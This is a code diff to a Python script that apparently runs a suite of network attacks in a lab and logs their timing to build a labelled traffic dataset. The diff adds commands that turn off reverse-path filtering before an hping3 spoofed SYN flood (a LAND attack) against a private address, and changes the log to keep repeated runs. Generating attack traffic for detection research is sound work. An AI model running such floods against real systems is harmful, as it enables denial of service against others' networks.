@@ -55,6 +55,8 @@ EXTERNAL_ATTACKS = [
     {
         'name': 'LAND_attack',
         'cmds': [
+            'echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter && '
+            'echo 0 > /proc/sys/net/ipv4/conf/default/rp_filter && '
             'hping3 -S --flood --spoof 192.168.10.10 192.168.10.10 -p 80',
         ],
     },
@@ -140,9 +142,16 @@ def snapshot_csv(attack_name):
     print(f'[+] {"Appended" if file_exists else "Created"} {len(df)} rows to {out_path}')
 
 ATTACKS = determine_attack_suite()
-os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
 
 log = []
+
+os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
+if os.path.exists(LOG_PATH):
+    with open(LOG_PATH, 'r') as f:
+        loaded_log = json.load(f)
+        if isinstance(loaded_log, list):
+            log = loaded_log
+
 
 for attack in ATTACKS:
     duration = attack.get('duration', DEFAULT_DURATION)
@@ -173,11 +182,17 @@ for attack in ATTACKS:
     # snapshot the CSV immediately after attack stops
     snapshot_csv(attack['name'])
 
-    log.append({
-        'attack_type': attack['name'],
-        'start':       start,
-        'end':         end,
-    })
+    existing_entry = next((entry for entry in log if entry.get('attack_type') == attack['name']), None)
+
+    if existing_entry is None:
+        log.append({
+            'attack_type': attack['name'],
+            'start':       [start],
+            'end':         [end],
+        })
+    else:
+        existing_entry['start'].append(start)
+        existing_entry['end'].append(end)
 
     print(f'    start : {start:.2f}')
     print(f'    end   : {end:.2f}')
